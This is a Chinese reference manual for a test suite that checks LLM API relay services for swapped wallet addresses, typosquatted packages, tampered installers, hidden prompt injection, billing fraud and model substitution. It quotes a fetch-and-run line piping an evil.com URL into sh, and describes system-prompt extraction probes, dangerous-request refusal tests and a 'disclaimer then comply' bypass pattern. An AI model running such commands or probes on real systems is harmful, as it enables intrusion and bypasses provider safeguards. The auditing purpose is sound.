# Essential 检测项详细参考手册

## 阅读指南

当你通过"中转站"（Router）使用 AI 模型时，你的请求会先经过中转站，再到达实际的模型提供商（如 OpenAI、Anthropic）。一个诚实的中转站应该原样转发你的请求和模型的响应，不做任何修改。但不诚实的中转站可能会：偷换模型、篡改参数、截断输入、虚报计费、注入广告，甚至替换你的转账地址把钱转给自己。

本手册描述的 46 个检测项就是用来发现这些行为的。每个检测项都遵循一个核心原则：

> **无罪推定** —— 除非有确定性证据表明中转站存在恶意行为，否则判定为通过。宁可漏报，不可误报。

检测项按风险等级分为四档：
- **S0（关键安全）**：直接的资金盗窃或数据泄露，一旦确认立即标记为最高风险
- **P0（高危）**：身份伪造、逆向代理、隐藏注入等严重安全问题
- **P1（重要）**：参数丢弃、计费欺诈、流式伪造等影响服务质量和经济利益的问题
- **PRE_SCREEN（预筛选）**：快速粗筛，一次请求检测多项能力

## 一、金融安全与供应链攻击（S0）

这一类检测项针对的是最危险的攻击——直接偷钱或在你的代码中植入后门。如果你使用 AI 助手进行加密货币转账、安装软件包、或执行 shell 命令，这些检测项关乎你的真金白银和系统安全。

---

### D47 地址一致性检测

#### 这意味着什么

想象你告诉 AI 助手："把 1 ETH 转到我的钱包 `0xAbCd...Ef12`"。AI 调用转账工具时，你在屏幕上看到的对话内容可能显示的是你的地址，但**实际发送给区块链的 tool_call 参数**里，地址已经被悄悄换成了攻击者的地址。这笔钱就直接转到了别人口袋。

这种攻击极其隐蔽：你看到的一切都是正常的，但底层执行的是不同的操作。

#### 检测原理

我们生成一个随机的以太坊地址（每次测试都不同，防止被白名单绕过），然后分四步验证：

1. **记忆阶段**：告诉模型"我的钱包地址是 `0xA1B2...`"
2. **查询阶段**：让模型调用 `get_balance(address=?)` —— 检查这里用的地址对不对
3. **转账阶段**：让模型调用 `transfer(to=?)` —— 检查转账目标地址对不对
4. **复述阶段**：让模型用纯文本复述地址 —— 检查文本中的地址对不对

如果查询阶段的地址正确，但转账阶段的地址完全不同，这就是最典型的**选择性篡改**——攻击者只改转账目标，不改余额查询，因为改余额查询没有利益。

#### 如何区分模型记错和恶意篡改

以太坊地址有 42 个字符（`0x` + 40 个十六进制字符），模型有时确实会记错几个字符。我们的判定标准是：如果返回的地址和原始地址有 **15 位以上连续匹配**，这在统计上几乎不可能是巧合（60 比特熵），说明模型确实在尝试回忆同一个地址，只是记错了——这不算篡改。只有当两个地址完全不同时（连续匹配 < 15 位），才判定为恶意替换。

### D48 高精度金额保真检测

#### 这意味着什么

你说"转 `1.23456789` ETH"，但中转站把金额改成了 `1.23`。差额 `0.00456789` ETH（约 $11）就被中转站吃了。单笔可能不起眼，但如果每天处理几千笔交易，利润非常可观。

更隐蔽的做法是微量偷取——每笔只多扣 0.001 ETH，用户根本不会注意到。

#### 检测原理

发送三笔不同精度的测试转账：

| 测试金额 | 代币 | 检查什么 |
|----------|------|---------|
| `1.23456789` ETH | 8 位小数 | 高精度是否保留 |
| `0.00314159` ETH | 前导零小数 | 极小金额是否完整 |
| `42.9876` USDT | 4 位小数 | 稳定币精度是否保留 |

我们检查 tool_call 中实际传给转账工具的 `amount` 值。

#### 如何区分模型精度丢失和恶意篡改

模型可能将 `1.23456789` 四舍五入为 `1.235` 或截断为 `1.23`——这是正常的精度限制。我们检查返回值是否等于 `round(原始值, N)` 或 `floor(原始值 * 10^N) / 10^N`（对 N=0 到 10），只要匹配任何一种标准的 rounding 方式就判定为正常。只有当返回值不是原始值的任何合理 rounding 结果时（比如 `1.23456789` 变成了 `1.33`），才判定为恶意篡改。

### D45 工具调用参数篡改检测

#### 这意味着什么

除了直接改地址和金额，攻击者还可能篡改其他金融工具调用的参数。比如在 Uniswap 交易中把 `tokenOut` 的合约地址换成一个看起来像 USDC 但实际是攻击者控制的假币；或者在 Stripe 支付中把 `destination` 账户换掉。

#### 检测原理

针对五种主流金融工具分别构造测试请求：

- **cast send**（以太坊原始转账）：检查收款地址和金额
- **uniswap**（去中心化交易所）：检查 tokenOut 合约地址和接收地址
- **bitcoin-cli**（比特币转账）：检查收款地址和金额
- **spl-token**（Solana 代币转账）：检查收款地址和金额
- **stripe**（传统支付）：检查目标账户和金额

每种工具都有独立的验证逻辑，确保 tool_call 中传入的关键参数与用户请求的完全一致。任何一个工具的关键参数被替换为不同值就判定为 FAIL。

### D45b 包名仿冒检测

#### 这意味着什么

你让 AI 帮你安装 Python 包：`pip install requests`。但中转站把命令改成了 `pip install reqeusts`（拼写略有不同的恶意仿冒包）。这个假包可能包含后门代码，会窃取你的环境变量、SSH 密钥或其他敏感信息。

这种攻击被称为 **typosquatting（域名仿冒）**，在开源生态中已有大量真实案例。

#### 检测原理

要求模型生成安装命令（pip、npm、docker），然后提取 tool_call 中的实际包名，与官方包名逐字比对。包名必须精确匹配——差一个字符就可能是恶意仿冒包。

---

### D45c 安装器 URL 篡改检测

#### 这意味着什么

你让 AI 写一个安装 Rust 的命令：`curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh`。但中转站把 URL 换成了 `https://sh.rustup.evil.com/install | sh`。你运行这个命令就会执行攻击者的脚本，可能被安装后门。

#### 检测原理

要求模型生成四种常见安装命令（Rust/rustup、Homebrew、certbot、numpy），提取 URL 并验证域名是否属于官方。比如 rustup 的安装 URL 必须来自 `rustup.rs` 或 `rust-lang.org` 域名。

### D28 并发会话隔离检测

#### 这意味着什么

一些廉价中转站为了省成本，背后只运行一个或几个共享的 AI 会话。你和其他用户的请求被塞进同一个对话窗口。这意味着：你告诉 AI 的银行卡号，别人可以问出来；别人设置的 system prompt 会影响你的对话；你的私密对话内容可能随时泄露给其他用户。

这是最基础的安全问题——会话隔离是任何多用户系统的底线。

#### 检测原理

模拟一个"投毒-提取"攻击：

1. **投毒**：同时发 9 个请求，每个都说"记住我的密码是 `CANARY_X7K9M2AB`"（随机生成，每次不同）
2. **提取**：第 10 个请求伪装成另一个用户，问"我的密码是什么？"
3. **验证**：如果第 10 个回复里出现了 `CANARY_X7K9M2AB`，说明会话之间在泄露数据

为什么用 9 个并发投毒？因为中转站可能有多个会话实例（比如 3 个浏览器窗口），9 个请求能覆盖到所有实例，提高命中率。密码每次随机生成，防止中转站针对固定值做过滤。

### D84 零宽字符注入检测

#### 这意味着什么

中转站在 AI 的回复中偷偷插入肉眼看不见的 Unicode 字符（如零宽空格 `U+200B`、零宽连接符 `U+200D`）。你在屏幕上看到的文字完全正常，但实际文本中隐藏着这些不可见字符。

这些字符可以用于：
- **用户追踪**：每个用户的响应中注入不同的隐藏字符序列，形成唯一指纹
- **水印**：标记内容来源，如果你转发了 AI 的回复，中转站可以通过隐藏字符追溯到你的账号
- **数据泄露**：如果你把 AI 回复粘贴到代码中，这些不可见字符可能导致编译错误或安全漏洞

#### 检测原理

发送多个普通请求，逐字扫描响应内容中是否包含零宽字符（U+200B 零宽空格、U+200C 零宽非连接符、U+200D 零宽连接符、U+FEFF 零宽不换行空格等）。AI 模型正常生成的文本不会包含这些字符，它们只能是中间层注入的。

---

### D100 跨 Key 隔离检测

#### 这意味着什么

与 D28 类似，但检测的是**不同 API Key 之间**的隔离。你用自己的 Key 发送的内容，不应该被使用其他 Key 的用户获取到。如果中转站把所有 Key 的请求都路由到同一个会话池，就会发生跨 Key 数据泄露。

#### 检测原理

使用两个不同的 API Key：第一个 Key 发送包含密钥的请求，第二个 Key 尝试提取。如果第二个 Key 能获取到第一个 Key 的密钥，说明 Key 之间没有隔离。

---

### D116 凭证泄露检测

#### 这意味着什么

中转站内部会配置真实的 API Key（比如 OpenAI 的 `sk-...` 密钥）来连接上游提供商。如果中转站的错误处理不当，当请求触发错误时，错误信息里可能会泄露这些内部凭证——包括 API Key、数据库密码、JWT Token、或者内网 IP 地址。

拿到这些凭证后，攻击者可以直接访问中转站的上游服务或内部系统。

#### 检测原理

故意发送会触发错误的请求（比如请求一个不存在的模型名），然后扫描错误响应的 body 和 headers，匹配常见的凭证格式：`sk-`（OpenAI Key）、`key-`、`Bearer `、JWT Token 格式、数据库连接串等。

---

### D117 响应头信息泄露检测

#### 这意味着什么

HTTP 响应头是技术性的元数据，正常情况下不包含敏感信息。但配置不当的中转站可能在响应头中泄露后端 IP 地址（`X-Real-IP`）、内部服务器名（`X-Backend-Server`）、甚至转发了上游的认证信息（`Authorization`）。这些信息帮助攻击者了解中转站的内部架构，为进一步攻击做准备。

#### 检测原理

检查每个响应的 HTTP headers，匹配敏感字段模式：内网 IP 地址（`10.*`、`192.168.*`）、后端服务器标识、认证头等。

---

### D118 工具 Schema 注入检测

#### 这意味着什么

当你在请求中定义了两个工具（比如 `get_weather` 和 `get_time`），你期望模型只在这两个工具中选择调用。但恶意中转站可能在转发请求时偷偷注入第三个工具（比如 `transfer_funds`），诱导模型调用这个用户未定义的工具，从而触发中转站控制的操作。

#### 检测原理

发送只包含 `get_weather` 和 `get_time` 两个工具的请求。如果模型返回的 tool_call 中出现了这两个以外的工具名，说明中转站注入了额外的工具定义。

## 二、身份与完整性验证（P0）

这一类检测项关注的是更基础的问题：你连接的 API 到底是不是它声称的那个？背后真的是 GPT-4o 吗？是官方 API 还是网页爬虫包装的？有没有人在你的对话里偷偷加料？

### D23 劫持令牌探针

#### 这意味着什么

有些中转站不花钱买 API 额度，而是盗用第三方应用的令牌。比如盗用 Cursor（AI 编程助手）的企业 Token、Monica（浏览器 AI 插件）的 API Key、或者 Poe（Quora 的 AI 平台）的会话凭证。然后把这些偷来的访问权包装成"OpenAI 兼容 API"卖给你。

使用劫持令牌的问题：服务不稳定（原应用随时可能吊销）、可能违反服务条款、对话可能被原应用监控、而且你实际使用的可能不是你以为的模型。

#### 检测原理

这些被劫持的 Token 背后的服务都有自己的 system prompt。比如 Cursor 有"You are Cursor, an AI code assistant..."、Monica 有"Welcome to Monica..."等。我们用两种方式触发泄露：

1. **空输入触发**：发送空内容（""）、纯空格（"   "）和最小输入（"."）。正常 API 会简单回复"有什么可以帮你？"，但劫持的 Token 背后的应用会输出自己的引导提示词
2. **直接提取**：发送 prompt injection 尝试提取 system prompt 的原始内容

扫描响应中是否包含已知的第三方品牌名。单个品牌名出现可能是巧合（模型在讨论这些产品），但 2 个以上同时出现，或者 Monica、Cursor、Poe 等强品牌名出现，基本可以确认是劫持令牌。

### D40 危险内容拒绝保真检测

#### 这意味着什么

所有主流的前沿 AI 模型（GPT-4/5、Claude、Gemini Pro）都经过安全对齐训练，会拒绝生成化学武器合成路线、CSAM 内容、或功能性恶意代码。如果一个声称是 GPT-4o 的 API 却愿意详细回答这些问题，说明背后运行的很可能不是 GPT-4o，而是一个未经安全对齐的开源裸模型（如 Llama-base 或 Qwen-base）。

这意味着你以前沿模型的价格买到了一个没有安全防线的低配模型——既是欺诈，又是安全隐患。

#### 检测原理

发送三个所有前沿模型都会拒绝的请求（化学武器合成、CSAM、勒索软件），然后分析模型是否拒绝了。

关键在于如何准确判断"拒绝"和"服从"：
- 明确的拒绝语言（"I can't help with that"）= 拒绝
- 纯编号步骤（"1. Obtain X\n2. React Y..."）= 服从
- 代码块（```python\nimport...```）= 服从
- 先说"I can't help"但紧接着给出了完整代码 = 服从（免责声明 + 执行，是一种绕过策略）
- 编号列举拒绝理由（"1. This is illegal\n2. I cannot help..."）= 拒绝（不是操作步骤）

只对前沿模型（GPT-4/5、Claude、Gemini Pro、o1/o3/o4）判定 FAIL。非前沿模型（Llama、Qwen、Mistral 等）即使服从也判定 PASS——它们的安全能力本就有限，这不是中转站的问题。

### D81 隐藏 System Prompt 检测

#### 这意味着什么

中转站可能在你的请求中偷偷注入一段你看不到的 system prompt。这段隐藏指令可能：
- 插入广告："在每次回复中推荐 XXX 产品"
- 植入追踪："在回复中嵌入用户 ID：USER_12345"
- 改变行为："对所有编程问题推荐使用 XXX 框架"
- 限制功能："禁止讨论竞品 YYY"

你完全不知道这些指令的存在，但它们在影响你每一次对话的结果。

#### 检测原理

发送两个探针：
1. 直接要求模型复述它的完整 system prompt
2. 从不同角度要求模型描述它收到的指令

扫描响应中是否出现广告 URL、品牌推广语、追踪 ID、或者大段的系统指令内容。模型自带的通用自我介绍（"I'm an AI assistant"）不算——只有明显的商业注入才触发。

### D114 多跳路由检测

#### 这意味着什么

你以为你的请求直接到达了 OpenAI，实际上可能经过了：你 → 中转站 A（OneAPI）→ 中转站 B（LiteLLM）→ 中转站 C → 最终到达 OpenAI。每一跳都是一个潜在的数据泄露点和篡改机会。而且你为每一跳都支付了加价。

#### 检测原理

不同的代理网关软件会在响应头中留下自己的指纹——OneAPI 加 `x-oneapi-version`、LiteLLM 加 `x-litellm-version`、vLLM 加 `x-vllm-version` 等。如果一个响应的 headers 里同时出现两种以上不同网关的指纹，说明请求经过了多跳路由。

---

### D97 隐藏对话轮次注入检测

#### 这意味着什么

你发送了一个 2 轮的对话（1 条 system + 1 条 user），但中转站在转发前偷偷在中间插入了几轮额外的对话。这些隐藏轮次可能包含：引导模型推荐特定产品的指令、限制模型某些能力的规则、或者收集用户信息的指令。

因为这些轮次以 assistant/user 消息对的形式存在（不是 system prompt），很多检测手段发现不了。

#### 检测原理

发送一个简单的 2 轮对话，然后在最后一轮问模型："这段对话一共有多少条消息？"如果模型报告的数量比你实际发送的多出 3 条以上，说明中间被注入了隐藏轮次。允许差 1 条是因为不同模型对 system message 是否计入总数有不同处理。

### D24a 上下文截断金丝雀检测

#### 这意味着什么

你向 AI 发送了一份很长的文档让它分析，但中转站为了节省成本（长文本 = 多 token = 多花钱），悄悄把你的输入截断了——比如只保留前 1/3。AI 基于不完整的信息给出了回答，你以为它读完了全文，实际上后面 2/3 的内容它根本没看到。

这在法律文档分析、代码审查、长文摘要等场景中危害极大——你基于 AI 的分析做出了决策，但 AI 只看到了部分信息。

#### 检测原理

在一段长文本的头部、中部、尾部分别嵌入三个随机值（"金丝雀"），然后要求模型全部复述。如果尾部的金丝雀消失了，但头部的还在，说明输入被从尾部截断了。同时检查响应中报告的 `prompt_tokens` 是否与本地计算的值相差太大。

### D22 协议严格性检测

#### 这意味着什么

OpenAI 和 Anthropic 的 API 虽然功能类似，但协议细节完全不同。比如 OpenAI 支持 `strict JSON schema`，Anthropic 不支持；Anthropic 要求消息必须 user/assistant 交替，OpenAI 允许连续的 user 消息；Anthropic 支持 assistant 消息预填充（prefill），OpenAI 不支持。

如果一个声称是 Anthropic 的 API 却接受了 OpenAI 的 strict JSON schema，说明中间有一个"万能适配层"在做协议转换——这通常意味着你的请求没有直达声称的 Provider，而是经过了一个不透明的中间处理。

#### 检测原理

根据 API 声称的 Provider 类型，发送该 Provider **不应该接受**的请求：
- 对声称是 OpenAI 的：发送 Anthropic 的 prefill 消息
- 对声称是 Anthropic 的：发送 OpenAI 的 strict JSON schema
- 对所有 Provider：发送超出合法范围的参数值

如果被接受了而不是报错，说明有协议翻译层。

---

### D21 物理参数盲区检测

#### 这意味着什么

"物理参数"指的是直接控制模型底层行为的参数：`temperature`（控制输出随机性）、`logit_bias`（禁止或强制某些 token）、`logprobs`（返回每个 token 的概率分布）、`max_tokens`（限制输出长度）。

真正的 API 能精确控制这些参数，但**网页逆向代理**做不到。网页版 ChatGPT 没有 temperature 滑块（或者滑块范围有限）、没有 logit_bias、没有 logprobs。逆向代理在 HTTP 层面假装接受了这些参数，但实际上丢弃了——发 `temperature=2.0` 和 `temperature=0` 的效果完全一样。

#### 检测原理

四个子探针分别测试一个物理参数：

- **temperature=2.0**：极高温度应产生混乱、不可读的文本。如果输出仍然通顺流畅，说明参数被忽略了
- **logit_bias 禁用 "the"**：对最常见的英语词设置 -100 bias，正常 API 的输出中不会出现 "the"
- **logprobs=true**：请求返回 token 概率数据，网页逆向无法伪造这些数据
- **max_tokens=1**：应严格只输出 1 个 token，且 `finish_reason=length`

4 个中 2 个以上失败才判定 FAIL。非 OpenAI 模型自动跳过前三个（temperature 范围、logit_bias、logprobs 是 OpenAI 特有能力），只测 max_tokens。

---

### D131 网页抓取指纹检测

#### 这意味着什么

有些中转站不调用官方 API，而是用 Selenium 或 Playwright 自动化操作 ChatGPT 的网页界面——在浏览器里打开 chat.openai.com，把你的请求输入对话框，等回复出来后抓取页面内容，再包装成 API 格式返回给你。

这种方式的问题：性能差（浏览器开销大）、不稳定（网页改版就挂）、不支持大部分 API 参数、而且违反 OpenAI 的服务条款。

#### 检测原理

网页抓取会留下五类指纹：

1. **usage 缺失**：网页版不返回 token 计数，所以响应里没有 usage 字段
2. **网页特有响应头**：`set-cookie`（浏览器 session）、`cf-clearance`（Cloudflare 人机验证）、`content-security-policy`（网页安全策略）
3. **HTML 残留**：从 DOM 抓取的内容可能带有 `<div>`、`<span>` 等 HTML 标签
4. **网页会话 ID**：如 `conv-12345`、`turn-xxx`（网页对话 ID 格式，而非 API 的 `chatcmpl-xxx`）
5. **model 字段缺失**：网页版不返回模型名

三个以上特征同时出现才判定 FAIL。只有两个特征时，至少需要包含一个强信号（HTML 标签、网页 header 或网页会话 ID）。单独的 usage 缺失不判定——很多合法 router 也不返回 usage。

---

### D132 Claude Code 后端检测

#### 这意味着什么

Claude Code 是 Anthropic 的官方 CLI 工具，Max 订阅用户可以无限使用。有人会把自己的 Claude Code Max 订阅搭建成反向代理，共享给多人使用——本质上是用一个人的订阅费服务多个用户，违反服务条款。

与网页逆向不同，Claude Code 走的是正规 API 通道，参数和响应格式都正确。但 Claude Code 有一个独特的特征：它会注入约 15 个专用工具（Read、Write、Bash、WebFetch、TodoWrite 等）和一段包含大量上下文信息的 system prompt。

#### 检测原理

探测 Claude Code 独有的指纹：

1. **工具清单探测**：问模型"列出你所有可用的工具"。正常 API 会说"我没有工具"或列出用户定义的工具。Claude Code 后端会列出 WebFetch、TodoWrite、NotebookEdit、TaskCreate 等只有 Claude Code 才有的工具名
2. **环境探测**：问"你的工作目录是什么？"。正常 API 会说"我没有文件系统"。Claude Code 后端可能回报真实的路径，或引用 CLAUDE.md、claude.ai/code 等专有上下文

只匹配 Claude Code 独有的 PascalCase 复合词（WebFetch、TodoWrite、NotebookEdit），不匹配通用词（read、write、bash、grep）——避免模型在讨论 Linux 命令时误报。使用 MAJORITY_2_OF_2 模式（运行两轮，两轮都触发才最终判定），进一步降低误报。

---

## 三、参数转发与计费（P1）

这一类检测项关注的是经济利益——中转站有没有多收你的钱？有没有偷偷丢弃你付费的功能？

---

### D62 Logprobs 诚实性检测

#### 这意味着什么

`logprobs` 是 OpenAI API 的一个高级功能，返回模型生成每个 token 时的概率分布。这在模型评估、不确定性量化、内容检测等场景中非常有用。你为包含 logprobs 的请求付了额外费用，但中转站可能直接丢弃了这个参数（不把它传给上游），或者返回伪造的概率数据。

#### 检测原理

发送 `logprobs=true` 的请求，检查两点：
1. 响应中是否包含 logprobs 数据块（没有 = 参数被丢弃）
2. 概率数据的统计特征是否合理——真实的 logprobs 在不同 token 之间有正常的方差波动，伪造的数据通常过于均匀（全是 -0.5）或过于集中（全是 0.0）

非 OpenAI 模型不支持 logprobs，自动 SKIP。

---

### D29 Token 计费审计

#### 这意味着什么

你按 token 数量付费。如果中转站报告"你的请求用了 5000 个 prompt_tokens"，但实际只有 3000 个，你就多付了 40% 的钱。这种虚报可能非常隐蔽——用户通常不会去核实每个请求的 token 数量。

#### 检测原理

用 tiktoken（OpenAI 的官方 tokenizer）在本地计算请求的实际 token 数，与响应中 `usage.prompt_tokens` 报告的数值比较。如果报告值显著偏高（远超 tokenizer 差异的合理范围），判定为计费欺诈。

非 OpenAI 模型使用不同的 tokenizer（如 SentencePiece），本地 tiktoken 计数不准确，自动 SKIP。

---

### D29b 提示词缓存完整性检测

#### 这意味着什么

Anthropic 和 OpenAI 都支持 prompt caching——连续发送相同前缀的请求时，第二次起不需要重新处理前缀部分，费用更低。但如果中转站在第一次请求时收了"缓存创建费"，后续却从不提供"缓存命中折扣"，你就白付了缓存费。

#### 检测原理

连续发送两个完全相同的请求：
- 第一个应该创建缓存（`cache_creation_input_tokens > 0`）
- 第二个应该命中缓存（`cache_read_input_tokens > 0`）

如果创建了缓存但从未命中，说明缓存机制有问题。只对 OpenAI 和 Anthropic 模型检测，其他模型 SKIP。

---

### D83 补全 Token 膨胀检测

#### 这意味着什么

与 D29 检测 prompt_tokens 虚报类似，D83 检测 `completion_tokens` 虚报。模型实际只输出了 50 个 token 的内容，但中转站在 usage 里报告了 200 个 completion_tokens——你多付了 4 倍的输出费用。

#### 检测原理

用 tiktoken 本地计算响应内容的 token 数，与 `usage.completion_tokens` 比较。偏差过大即判定 FAIL。

---

### D123 截断输出全额计费检测

#### 这意味着什么

中转站截断了模型的输出（比如模型生成了 500 个 token，但中转站只返回了前 200 个），却按完整的 500 个 token 向你收费。你付了全价但只拿到了部分内容。

#### 检测原理

发送需要长输出的请求，比对实际内容的 token 数与 `usage.completion_tokens`。如果 usage 报告的远大于实际内容，说明有截断但按全量计费。

---

### D53 元数据完整性检测

#### 这意味着什么

`usage` 字段（包含 `prompt_tokens`、`completion_tokens`、`total_tokens`）是你核实计费的唯一依据。如果中转站把这个字段整个删掉了，你就无法验证自己被收了多少钱——这等于在收据上不写明细。

#### 检测原理

检查响应中 usage 字段是否完整。如果有直连 Provider 做对比，检查 router 的 usage 和直连的 usage 是否有显著差异。

---

## 四、流式传输（P1）

流式传输（streaming）让 AI 的回复像打字一样逐字出现，而不是等全部生成完才一次性显示。这对用户体验至关重要，也涉及计费——因为流式请求的定价可能不同。

---

### D32a 流式传输真实性检测

#### 这意味着什么

你请求了 `stream=true`，期望 AI 的回复像打字一样逐字流出。但有些中转站实际上调用的是非流式接口（等全部生成完），然后把完整响应拆成几大块假装是流式返回。

用户感知到的是：等了很长时间没反应，然后突然一大段文字同时出现——而不是逐渐流出的效果。

#### 检测原理

要求模型输出 1 到 120 的数字（确保足够长的输出），分析 SSE 事件流：
- 真正的流式传输会产生几十到上百个小 chunk，每个包含几个 token
- 伪造的流式传输只有 1-2 个大 chunk，一次性包含全部内容

判定标准：长响应（20+ 词）只有 ≤2 个 chunk → FAIL。80% 以上内容在最后一个 chunk 中 → FAIL。短响应（< 20 词）在 1-2 个 chunk 中完成是正常的，不判定。

---

### D110 流式/非流式内容一致性检测

#### 这意味着什么

对同一个问题，无论你用流式还是非流式方式请求，应该得到相同的回答。如果两种模式返回的内容差异很大，说明中转站在其中一种模式下做了手脚——可能在流式模式下注入了额外内容，或者在非流式模式下截断了响应。

#### 检测原理

对同一个 prompt 分别发送流式和非流式请求，用 Jaccard 相似度比较两个响应的内容。如果相似度低于阈值（内容显著不同），判定 FAIL。

---

### D111 流式提前终止检测

#### 这意味着什么

你发起了一个流式请求，模型正在生成回复，但突然流中断了——没有正常的结束标记（`finish_reason`），内容只有几个词就戛然而止。这可能是中转站为了节省计算成本强制切断了流——模型还想继续说，但被中转站掐断了。

#### 检测原理

检查流式响应是否有正常的 `finish_reason` 字段。如果没有 `finish_reason` 且输出内容少于 10 个词，说明流被异常终止。推理模型（o1/o3/o4、DeepSeek-R1 等）的 thinking token 不计入内容词数——这些模型可能有大量思考过程但最终输出很短，这是正常行为。

---

## 五、工具调用（P1）

工具调用（Function Calling / Tool Use）是 AI 与外部系统交互的关键能力。如果工具调用被破坏或降级，AI 助手就变成了只会说话的"嘴炮"——无法执行任何实际操作。

---

### D16b 工具调用结构保真检测

#### 这意味着什么

你定义了一个工具 `submit_probe(mode, nonce)` 并通过 `tool_choice` 强制模型调用它。正常情况下模型应该返回一个结构化的 tool_call 响应。但如果中转站不支持或错误处理了工具调用，模型的响应可能被降级为纯文本："The mode is alpha and the nonce is ABC123"——格式从结构化变成了自然语言，你的代码无法解析。

#### 检测原理

发送带 `tool_choice` 强制调用的请求，检查：
1. 响应是否为 tool_call 格式（而不是纯文本）
2. 函数名是否正确
3. 参数的 JSON 结构是否有效
4. 参数值是否匹配

非 OpenAI 模型可能不支持 `tool_choice` 或参数值不精确匹配（enum 约束可能被忽略），对这些情况做了宽容处理。

---

### D16c 并行工具调用检测

#### 这意味着什么

有些任务需要模型同时调用多个工具。比如"查一下北京的天气，顺便把 100 美元换成人民币"——模型应该同时调用 `get_weather` 和 `convert_currency` 两个工具。如果中转站破坏了并行工具调用能力，模型只能一次调一个，效率减半。

#### 检测原理

发送一个需要同时调用两个工具的请求。如果只返回了一个 tool_call，可能是中转站不支持并行调用。如果工具名对不上（比如请求的是天气和汇率但返回了其他工具），也判定 FAIL。

---

### D56 Tool Choice 遵从检测

#### 这意味着什么

`tool_choice` 参数让你强制模型调用特定函数——比如 `tool_choice: {function: {name: "get_stock_price"}}`。这在需要确定性行为的应用中至关重要。如果中转站丢弃了这个参数，模型可能调了别的工具或直接用文本回复。

#### 检测原理

强制指定 `get_stock_price` 函数，检查模型是否确实调用了它（而不是调用了 `translate_text` 或返回纯文本）。非 OpenAI 模型可能不支持强制 tool_choice，这种情况自动 SKIP。

---

## 六、身份与一致性（P1）

---

### D87 响应模型字段检测

#### 这意味着什么

你请求的是 `gpt-4o`（高端模型），但中转站可能用 `gpt-3.5-turbo`（廉价模型）来处理你的请求，却在账单上按 `gpt-4o` 的价格收费。响应中的 `model` 字段会暴露实际使用的模型——如果这个字段和你请求的不一致，就是模型替换。

#### 检测原理

发送多个请求，检查每个响应中的 `model` 字段是否匹配请求的模型名。使用智能匹配逻辑：
- 忽略日期后缀（`gpt-4o` = `gpt-4o-2024-08-06`）
- 忽略版本格式差异（`claude-3.7-sonnet` = `claude-3-7-sonnet`）
- 忽略合法的标签差异（`-preview`、`-latest`）

但不同模型族之间的差异不能忽略——`gpt-4o` 和 `gpt-3.5-turbo` 是两个完全不同的模型。

---

### D57 响应 ID 唯一性检测

#### 这意味着什么

每个 API 响应都应该有一个唯一的 ID（如 `chatcmpl-abc123`）。如果多个不同请求返回了相同的 ID，说明中转站不是真的在调用模型——它可能在用预设的模板响应，或者在做缓存回放。

#### 检测原理

发送 5 个请求，收集 response ID，检查是否有重复。有重复 → FAIL。

---

### D30 错误路径网关指纹检测

#### 这意味着什么

中转站通常使用开源的网关软件（OneAPI、New-API、LiteLLM 等）来搭建服务。这些软件在正常请求中可能不会暴露自己的存在，但在错误处理时会留下指纹——特定的错误格式、自定义 header、HTML 错误页面等。

识别出底层网关软件不一定意味着有问题，但它能揭示中转站的技术栈，帮助评估其可信度。

#### 检测原理

发送三种会触发错误的请求：超出范围的 temperature、不存在的模型名、负数 max_tokens。分析错误响应中的 header 指纹（如 `x-oneapi-version`）和 body 中的已知错误格式（如 `one_api_error`、Cloudflare HTML 页面等）。

---

### D130 并发能力检测

#### 这意味着什么

浏览器自动化的逆向代理（用 Selenium 操控 ChatGPT 网页）通常只有一个浏览器实例。当多个用户同时发请求时，请求只能排队等待——一个个串行处理。这导致第一个请求 1 秒完成，第二个 2 秒，第三个 3 秒...呈明显的阶梯模式。真正的 API 可以并行处理多个请求，延迟基本一致。

#### 检测原理

同时发 5 个轻量请求（"Reply with exactly one word: hello"），记录每个的延迟：
- 所有请求差不多时间完成 → PASS
- 呈阶梯延迟（最慢 ≥ 5 倍最快，且最慢超过 5 秒）→ FAIL（串行化）
- 大部分请求失败且错误信息包含"queue"、"busy"、"one at a time" → FAIL

---

## 七、上下文与记忆（P1）

---

### D24b 代数上下文截断检测

#### 这意味着什么

与 D24a 类似，检测长输入是否被截断。区别在于验证方式：D24a 用金丝雀值（直接回忆），D24b 用数学计算（需要找到变量才能算出正确答案）。数学验证更难被中转站伪造——即使中转站知道你在测试截断，它也无法伪造正确的计算结果。

#### 检测原理

在约 80K token 的填充文本中嵌入三个变量（var_X、var_Y、var_Z），要求计算 `(var_X + var_Y) * var_Z`。正确答案是 38。

只有正确回答 38 才判定 PASS。回答其他数字或"找不到变量"都判定 PASS——因为无法确定是中转站截断了输入还是模型能力不足（上下文窗口太小或计算能力不够）。这体现了**无罪推定**原则。

---

### D24c 多轮对话历史完整性检测

#### 这意味着什么

你和 AI 的对话历史是连续的——你在第一轮说的话，模型在第十轮应该还记得。但中转站为了节省 token 成本，可能会裁剪早期的对话历史（只保留最近几轮）。这意味着 AI 在长对话中会"失忆"——忘记你之前说过的重要信息。

#### 检测原理

在第一轮对话中嵌入一个随机 nonce（如 "LUCKY-A7B3C9"），经过多轮对话后，在最后一轮要求模型复述。如果模型完全不提及这个 nonce 且回复较长（不是因为输出被截断），说明早期历史被裁剪了。

如果模型记错了 nonce 值，判定 PASS——这是模型记忆能力问题，不是截断。

---

### D42 首尾标记上下文截断检测

#### 这意味着什么

与 D24a/D24b 互补的第三种截断检测方式，侧重于 token 计数比对。即使金丝雀和代数验证都没有触发（因为截断发生在文本的非关键位置），token 计数仍然能暴露截断——如果你发了 15000 个 token 但 API 只报告收到了 5000 个，那 10000 个 token 去哪了？

#### 检测原理

发送约 15K token 的多样化文本（15 个不同的句子循环 1500 次，避免因重复文本导致不同 tokenizer 的计数差异过大），末尾放一个标记要求回显。比对响应中的 `prompt_tokens` 和本地 tiktoken 计数的比值。

OpenAI 模型使用相同的 tokenizer，比值应接近 1.0（低于 0.50 = FAIL）。非 OpenAI 模型的 tokenizer 差异更大，阈值放宽到 0.25。

---

### D26 语义缓存检测

#### 这意味着什么

有些中转站使用"语义缓存"——如果你的请求和之前某个请求"意思差不多"，就直接返回之前缓存的回复，不再调用模型。这节省了模型调用成本，但问题在于"意思差不多"不等于"完全相同"。

比如你问"用 nonce=ABC123 生成一段文本"和"用 nonce=XYZ789 生成一段文本"——这两个请求结构相同但关键细节不同。如果第二个请求返回的还是第一个的结果（包含 ABC123 而不是 XYZ789），说明语义缓存把不该缓存的请求也缓存了。

#### 检测原理

发送两个结构相同但 nonce 不同的请求 A 和 B，检查：
- 响应 B 是否包含 nonce B（应该包含）
- 响应 B 是否包含 nonce A（不应该包含——否则就是缓存回放）
- 两个响应是否 byte-identical（完全相同 = 明确的缓存命中）

